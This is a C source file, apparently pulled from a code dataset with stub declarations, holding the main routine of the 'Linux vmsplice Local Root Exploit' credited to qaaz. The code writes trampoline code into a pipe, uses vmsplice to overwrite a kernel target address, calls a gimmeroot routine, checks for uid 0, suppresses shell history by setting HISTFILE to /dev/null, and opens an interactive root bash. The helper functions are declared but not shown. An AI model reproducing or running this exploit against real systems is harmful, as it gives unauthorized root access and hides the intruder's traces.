
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct iovec {int iov_len; void* iov_base; } ;


 int TRAMP_CODE ;
 int TRAMP_SIZE ;
 int _vmsplice (int,struct iovec*,int,int ) ;
 int die (char*,int ) ;
 int errno ;
 int execl (char*,char*,char*,int *) ;
 long get_target () ;
 int getgid () ;
 scalar_t__ getuid () ;
 int gid ;
 int gimmeroot () ;
 scalar_t__ pipe (int*) ;
 int printf (char*,...) ;
 int putenv (char*) ;
 int setresgid (int ,int ,int ) ;
 int setresuid (scalar_t__,scalar_t__,scalar_t__) ;
 scalar_t__ uid ;
 int write (int,int ,int ) ;

int main(int argc, char *argv[])
{
 int pi[2];
 long addr;
 struct iovec iov;

 uid = getuid();
 gid = getgid();
 setresuid(uid, uid, uid);
 setresgid(gid, gid, gid);

 printf("-----------------------------------\n");
 printf(" Linux vmsplice Local Root Exploit\n");
 printf(" By qaaz\n");
 printf("-----------------------------------\n");

 if (!uid || !gid)
  die("!@#$", 0);

 addr = get_target();
 printf("[+] addr: 0x%lx\n", addr);

 if (pipe(pi) < 0)
  die("pipe", errno);

 iov.iov_base = (void *) addr;
 iov.iov_len = TRAMP_SIZE;

 write(pi[1], TRAMP_CODE, TRAMP_SIZE);
 _vmsplice(pi[0], &iov, 1, 0);

 gimmeroot();

 if (getuid() != 0)
  die("wtf", 0);

 printf("[+] root\n");
 putenv("HISTFILE=/dev/null");
 execl("/bin/bash", "bash", "-i", ((void*)0));
 die("/bin/bash", errno);
 return 0;
}
